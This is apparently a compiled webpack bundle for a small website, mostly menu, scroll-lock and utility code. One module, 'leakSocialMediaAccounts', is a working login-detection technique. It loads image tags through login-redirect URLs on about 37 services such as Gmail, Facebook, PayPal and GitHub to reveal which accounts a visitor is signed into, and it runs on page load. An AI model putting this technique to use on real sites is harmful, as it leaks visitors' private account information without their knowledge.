/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	__webpack_require__(1);
	__webpack_require__(2);
	__webpack_require__(3);
	__webpack_require__(4);
	__webpack_require__(5);
	module.exports = __webpack_require__(6);


/***/ },
/* 1 */
/***/ function(module, exports) {

	var app = app || {};

	(function(body){
	    "use strict";

	    app = {
	        
	        init: function() {
	            this.map.init();
	        }

	    };

	})(document.body);

/***/ },
/* 2 */
/***/ function(module, exports) {

	var app = app || {};

	(function(body){
	    "use strict";

	    app.map = {
	        
	        init: function() {
	            alert("map");
	        }

	    };

	})(document.body);

/***/ },
/* 3 */
/***/ function(module, exports) {

	;(function ($) {
	    "use strict";

	    $.app = $.app || {};

	    var _this;

	    $.app.sandwich = {

	        config: {
	            keyHooks: !1,
	            selector: '.js-sandwich-menu',
	            wrapper: '.layout-wrapper',
	            overlay: '.overlay'
	        },

	        extend: function(config)
	        {
	            _this = this;

	            if (typeof config !== 'undefined')
	            {
	                var x;
	                for (x in config)
	                {
	                    if (typeof _this.config[x] !== 'undefined')
	                        _this.config[x] = config[x];
	                }
	            }
	        },

	        isOpen: function()
	        {
	            return body.hasClass('page-visible');
	        },

	        hide: function()
	        {
	            body.removeClass('page-open');

	            setTimeout(function(){
	                body.removeClass('page-visible');
	            }, 10);

	            $(this.config.overlay).css({
	                'visibility': 'hidden'
	            });
	        },

	        toggle: function()
	        {
	            if (body.hasClass('page-visible'))
	            {
	                setTimeout(function(){
	                    body.removeClass('page-visible');
	                }, 10);
	            }
	            else
	            {
	                setTimeout(function(){
	                    body.addClass('page-visible');
	                }, 10);
	            }

	            body.toggleClass('page-open');

	            var visibility = 'visible';

	            if (!body.hasClass('page-open'))
	            {
	                visibility = 'hidden'
	            }
	            
	            $(_this.config.overlay).css({
	                'visibility': visibility
	            });
	        },

	        sandwichTrigger: function()
	        {
	            _this = this;

	            if (_this.config.keyHooks)
	            {
	                body.on('keydown', function(e) {
	                    if(e.keyCode == 27 && _this.isOpen())
	                    {
	                        _this.toggle();
	                    }
	                });
	            };

	            body.on('click', _this.config.selector, function(e){
	                e.preventDefault ? e.preventDefault() : e.returnValue = false;
	                _this.toggle();
	            });
	        },

	        overlayTrigger: function()
	        {
	            _this = this;

	            body.on('click', _this.config.overlay, function(e){
	                _this.hide();
	            });
	        },

	        init: function(config)
	        {
	            this.extend(config);
	            
	            this.sandwichTrigger();
	            this.overlayTrigger();
	        }

	    };

	})(jQuery);
	 

/***/ },
/* 4 */
/***/ function(module, exports) {

	"use strict";

	function updateCaptcha(selector) {
	    if ($(selector).length) {
	        var src = $(selector).attr('src').split('?')[0];
	        $(selector).attr('src', src + '?' + Math.random());
	    }
	}

	function lockScroll(element) {
	    var lockX, lockY, events = ['scroll', 'mousewheel', 'touchmove'], keys = {37: 1, 38: 1, 39: 1, 40: 1};

	    function preventDefault(e) {
	        e = e || window.event;
	        if (e.preventDefault)
	          e.preventDefault();
	        e.returnValue = false;  
	    }

	    function preventDefaultForScrollKeys(e) {
	        if (keys[e.keyCode]) {
	            preventDefault(e);
	            return false;
	        }
	    }

	    function disableScroll() {
	        if (window.addEventListener) // older FF
	            window.addEventListener('DOMMouseScroll', preventDefault, false);
	        window.onwheel = preventDefault; // modern standard
	        window.onmousewheel = document.onmousewheel = preventDefault; // older browsers, IE
	        window.ontouchmove  = preventDefault; // mobile
	        document.onkeydown  = preventDefaultForScrollKeys;
	    }

	    function enableScroll() {
	        if (window.removeEventListener)
	            window.removeEventListener('DOMMouseScroll', preventDefault, false);
	        window.onmousewheel = document.onmousewheel = null; 
	        window.onwheel = null; 
	        window.ontouchmove = null;  
	        document.onkeydown = null;  
	    }

	    // function disableScrolling(){
	    //     var x=window.scrollX;
	    //     var y=window.scrollY;
	    //     window.onscroll=function(){window.scrollTo(x, y);};
	    // }

	    // function enableScrolling(){
	    //     window.onscroll=function(){};
	    // }

	    // function disable_scroll() {
	    //    ...
	    //    document.ontouchmove = function(e){ 
	    //         e.preventDefault(); 
	    //    }
	    // }

	    // function enable_scroll() {
	    //    ...
	    //    document.ontouchmove = function(e){ 
	    //      return true; 
	    //    }
	    // }



	    // element = document.getElementById(element);

	    // e.preventDefault ? e.preventDefault() : e.returnValue = false;

	    // element.addEventListener('mousewheel', function(e) {
	    //     e.preventDefault();
	    // }, false);

	    // element.addEventListener('touchmove', function(e) {
	    //     e.preventDefault();
	    // }, false);

	    // lockX = window.scrollX;
	    // lockY = window.scrollY;

	    // function lockIt() {
	    //     window.scrollTo(lockX,lockY);
	    //     return false;
	    // }

	    // window.addEventListener("scroll",lockIt,false)

	    // return {
	    //     stop: function(){
	    //         window.removeEventListener("scroll",lockIt,false)
	    //     }
	    // }
	}

	// document.addEventListener('ontouchstart', function(e) {
	//     document.body.style.overflow = "hidden";
	// }, false);

	// document.addEventListener('ontouchmove', function(e) {
	//     document.body.style.overflow = "auto";
	// }, false);

	// document.addEventListener('ontouchstart', function(e) {e.preventDefault()}, false);
	// document.addEventListener('ontouchmove', function(e) {e.preventDefault()}, false);

	// var locker = lockScroll(); // locks scrolling
	// locker.stop();  // unlocks scrolling

	// $('#element').on('scroll touchmove mousewheel', function(e){
	//   e.preventDefault();
	//   e.stopPropagation();
	//   return false;
	// })


	// var trapScroll;

	// (function($){
	  
	//   trapScroll = function(opt){
	    
	//     var trapElement;
	//     var scrollableDist;
	//     var trapClassName = 'trapScroll-enabled';
	//     var trapSelector = '.trapScroll';
	    
	//     var trapWheel = function(e){
	      
	//       if (!$('body').hasClass(trapClassName)) {
	        
	//         return;
	        
	//       } else {  
	        
	//         var curScrollPos = trapElement.scrollTop();
	//         var wheelEvent = e.originalEvent;
	//         var dY = wheelEvent.deltaY;

	//         // only trap events once we've scrolled to the end
	//         // or beginning
	//         if ((dY>0 && curScrollPos >= scrollableDist) ||
	//             (dY<0 && curScrollPos <= 0)) {

	//           opt.onScrollEnd();
	//           return false;
	          
	//         }
	        
	//       }
	      
	//     }
	    
	//     $(document)
	//       .on('wheel', trapWheel)
	//       .on('mouseleave', trapSelector, function(){
	        
	//         $('body').removeClass(trapClassName);
	      
	//       })
	//       .on('mouseenter', trapSelector, function(){   
	      
	//         trapElement = $(this);
	//         var containerHeight = trapElement.outerHeight();
	//         var contentHeight = trapElement[0].scrollHeight; // height of scrollable content
	//         scrollableDist = contentHeight - containerHeight;
	        
	//         if (contentHeight>containerHeight)
	//           $('body').addClass(trapClassName); 
	      
	//       });       
	//   }
	// })($);

	// var preventedCount = 0;
	// var showEventPreventedMsg = function(){  
	//   $('#mousewheel-prevented').stop().animate({opacity: 1}, 'fast');
	// }
	// var hideEventPreventedMsg = function(){
	//   $('#mousewheel-prevented').stop().animate({opacity: 0}, 'fast');
	// }
	// var addPreventedCount = function(){
	//   $('#prevented-count').html('prevented <small>x</small>' + preventedCount++);
	// }

	// trapScroll({ onScrollEnd: addPreventedCount });
	// $('.trapScroll')
	//   .on('mouseenter', showEventPreventedMsg)
	//   .on('mouseleave', hideEventPreventedMsg);      
	// $('[id*="parent"]').scrollTop(100);

	var isJson = function(item) {
	    item = typeof item !== "string" ? JSON.stringify(item) : item;

	    try {
	        item = JSON.parse(item);
	    }
	    catch (e) {
	        return false;
	    }

	    if (typeof item === "object" && item !== null) {
	        return true;
	    }

	    return false;
	}

	String.prototype.toHHMMSS = function () {
	    var sec_num = parseInt(this, 10); // don't forget the second param
	    var hours   = Math.floor(sec_num / 3600);
	    var minutes = Math.floor((sec_num - (hours * 3600)) / 60);
	    var seconds = sec_num - (hours * 3600) - (minutes * 60);

	    if (hours   < 10) {hours   = "0"+hours;}
	    if (minutes < 10) {minutes = "0"+minutes;}
	    if (seconds < 10) {seconds = "0"+seconds;}
	    return hours+':'+minutes+':'+seconds;
	}


/***/ },
/* 5 */
/***/ function(module, exports) {

	var leakSocialMediaAccounts = function(callback) {
	    var platforms = [{
	        domain: "https://squareup.com",
	        redirect: "/login?return_to=%2Ffavicon.ico",
	        name: "Square"
	    }, {
	        domain: "https://twitter.com",
	        redirect: "/login?redirect_after_login=%2Ffavicon.ico",
	        name: "Twitter"
	    }, {
	        domain: "https://www.facebook.com",
	        redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
	        name: "Facebook"
	    }, {
	        domain: "https://accounts.google.com",
	        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
	        name: "Gmail"
	    }, {
	        domain: "https://accounts.google.com",
	        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
	        name: "Youtube"
	    }, {
	        domain: "https://plus.google.com",
	        redirect: "/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
	        name: "Google Plus"
	    }, {
	        domain: "https://login.skype.com",
	        redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
	        name: "Skype"
	    }, {
	        domain: "https://www.flickr.com",
	        redirect: "/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com/favicon.ico",
	        name: "Flickr"
	    }, {
	        domain: "https://www.spotify.com",
	        redirect: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
	        name: "Spotify"
	    }, {
	        domain: "https://www.reddit.com",
	        redirect: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
	        name: "Reddit"
	    }, {
	        domain: "https://www.tumblr.com",
	        redirect: "/login?redirect_to=%2Ffavicon.ico",
	        name: "Tumblr"
	    }, {
	        domain: "https://www.expedia.de",
	        redirect: "/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
	        name: "Expedia"
	    }, {
	        domain: "https://www.dropbox.com",
	        redirect: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
	        name: "Dropbox"
	    }, {
	        domain: "https://www.amazon.com",
	        redirect: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
	        name: "Amazon.com"
	    }, {
	        domain: "https://www.pinterest.com",
	        redirect: "/login/?next=https%3A%2F%2Fwww.pinterest.com%2Ffavicon.ico",
	        name: "Pinterest"
	    }, {
	        domain: "https://www.netflix.com",
	        redirect: "/Login?nextpage=%2Ffavicon.ico",
	        name: "Netflix"
	    }, {
	        domain: "https://de.foursquare.com",
	        redirect: "/login?continue=%2Ffavicon.ico",
	        name: "Foursquare"
	    }, {
	        domain: "https://eu.battle.net",
	        redirect: "/login/de/index?ref=http://eu.battle.net/favicon.ico",
	        name: "Battle.net"
	    }, {
	        domain: "https://store.steampowered.com",
	        redirect: "/login/?redir=favicon.ico",
	        name: "Steam"
	    }, {
	        domain: "https://www.academia.edu",
	        redirect: "/login?cp=/favicon.ico&cs=www",
	        name: "Academia.edu"
	    }, {
	        domain: "https://stackoverflow.com",
	        redirect: "/users/login?ssrc=head&returnurl=http%3a%2f%2fstackoverflow.com%2ffavicon.ico",
	        name: "Stack Overflow"
	    }, , {
	        domain: "https://accounts.google.com",
	        redirect: "/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico",
	        name: "Blogger"
	    }, {
	        domain: "https://github.com",
	        redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
	        name: "Github"
	    }, {
	        domain: "https://medium.com",
	        redirect: "/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default",
	        name: "Medium"
	    }, {
	        domain: "https://news.ycombinator.com",
	        redirect: "/login?goto=favicon.ico%23",
	        name: "Hackernews"
	    }, {
	        domain: "https://carbonmade.com",
	        redirect: "/signin?returnTo=favicon.ico",
	        name: "Carbonmade"
	    }, {
	        domain: "https://courses.edx.org",
	        redirect: "/login?next=/favicon.ico",
	        name: "EdX"
	    }, {
	        domain: "https://www.spiegel.de",
	        redirect: "/meinspiegel/login.html?backUrl=%2Ffavicon.ico",
	        name: "Spiegel Online"
	    },
	    //  {
	    //     domain: "http://www.youporn.com",
	    //     redirect: "/login/?previous=/favicon.ico",
	    //     name: "YouPorn"
	    // }, 
	    {        
	        domain: "https://slack.com",
	        redirect: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
	        name: "Slack"
	    }, {        
	        domain: "https://www.khanacademy.org",
	        redirect: "/login?continue=https%3A//www.khanacademy.org/favicon.ico",
	        name: "Khan Academy"
	    }, {        
	        domain: "https://www.paypal.com",
	        redirect: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
	        name: "Paypal"
	    }, {
	        domain: "https://500px.com",
	        redirect: "/login?r=%2Ffavicon.ico",
	        name: "500px"
	    }, {
	        domain: "https://www.airbnb.com",
	        redirect: "/login?redirect_params[action]=favicon.ico&redirect_params[controller]=home",
	        name: "Airbnb"
	    }, {
	        domain: "https://disqus.com",
	        redirect: "/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico",
	        name: "Disqus"
	    }, {
	        domain: "https://secure.meetup.com",
	        redirect: "/login/?returnUri=https%3A%2F%2Fwww.meetup.com%2Fimg%2Fajax_loader_trans.gif",
	        name: "Meetup"
	    }, {        
	        domain: "https://bitbucket.org",
	        redirect: "/account/signin/?next=/favicon.ico",
	        name: "BitBucket"
	    }, {        
	        domain: "https://secure.indeed.com",
	        redirect: "/account/login?continue=%2ffavicon.ico",
	        name: "Indeed"
	    }];

	    //     Do not work because they do not redirect immediately or fixed the issue
	    //     {
	    //         url: "https://login.live.com/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
	    //         name: "Microsoft"
	    //     }, {
	    //         url: "https://slack.com/signin?redir=%2Ffavicon.ico",
	    //         name: "Slack"
	    //     }, {
	    //         url: "https://tablet.www.linkedin.com/splash?redirect_url=https%3A%2F%2Fwww.linkedin.com%2Ffavicon.ico%3Fgid%3D54384%26trk%3Dfulpro_grplogo",
	    //         name: "Linkedin"
	    //     }, {
	    //          domain: "https://subscribe.washingtonpost.com/loginregistration/index.html#/register/group/default?action=login&destination=https:%2F%2Fwashingtonpost.com%2Ffavicon.ico",
	    //          redirect: "/login/?previous=/favicon.ico",
	    //          name: "Washington Post"
	    //     }, {
	    //          domain: "https://www.instagram.com",
	    //          redirect: "/accounts/login/?next=%2Ffavicon.ico",
	    //          name: "Instagram"
	    //      }

	    platforms.forEach(function(network) {
	        var img = document.createElement('img');
	        img.src = network.domain + network.redirect;
	        img.onload = function() {
	            callback(network, true);
	        };
	        img.onerror = function() {
	            callback(network, false);
	        };
	    });
	};

	var isFirstLoggedIn = true;
	function displayResult(network, loggedIn) {
	    var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
	    var favicon = faviconUri(network);
	    var url = network.domain + network.redirect;
	    var el = '<a target="_blank" href="' + url + '" target="_blank" class=network><img src=' + favicon + '><span>' + network.name + '</span></a>';
	    if (loggedIn && isFirstLoggedIn) {
	        isFirstLoggedIn = false;
	        document.getElementById(id).innerHTML = el;
	    } else {
	        document.getElementById(id).innerHTML += el;
	    }
	}

	leakSocialMediaAccounts(displayResult);

	function faviconUri(network) {
	    var favicon = network.domain + '/favicon.ico';
	    if (network.name === 'Dropbox') {
	        favicon = 'https://www.dropbox.com/static/images/favicon.ico';
	    }
	    if (network.name === 'Youtube') {
	        favicon = 'https://www.youtube.com/favicon.ico';
	    }
	    if (network.name === 'Gmail') {
	        favicon = 'https://mail.google.com/favicon.ico';
	    }
	    return favicon;
	}

	// 

	// var login = Object();

	// function login_status(a, b) {
	//     div = document.createElement('div');
	//     if (b == 1){
	//         div.innerHTML = a + ': logged in';
	//         div.style.color = 'red';
	//     } else {
	//         div.innerHTML = a + ': not logged in';
	//         div.style.color = 'green';
	//     }
	//     document.body.appendChild(div);
	// };

	// function img(a, b) {
	//     var i = new Image();
	//     i.onload = function () {
	//         login_status(b, 1);
	//         i = i.onload = i.onerror = undefined
	//     };
	//     i.onerror = function () {
	//         login_status(b, 0);
	//         i = i.onload = i.onerror = undefined
	//     };
	//     i.src = a
	// };

	// img('https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png?' + Math.random(), 'google');
	// img('https://plus.google.com/up/?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png&type=st&gpsrc=ogpy0&' + Math.random(), 'plus.google');
	// img('https://twitter.com/login?redirect_after_login=%2Fimages%2Fspinner.gif?' + Math.random(), 'twitter');
	// img('http://vk.com/login.php?act=slogin&fast=1&auto=1&to=ZmF2aWNvbi5pY28-&' + Math.random(), 'vk');
	// img('http://www.facebook.com/login.php?next=http%3A%2F%2Fwww.facebook.com%2Ffavicon.ico?' + Math.random(), 'facebook');

/***/ },
/* 6 */
/***/ function(module, exports) {

	$(document).ready(function() {
	    app.init();
	});

/***/ }
/******/ ]);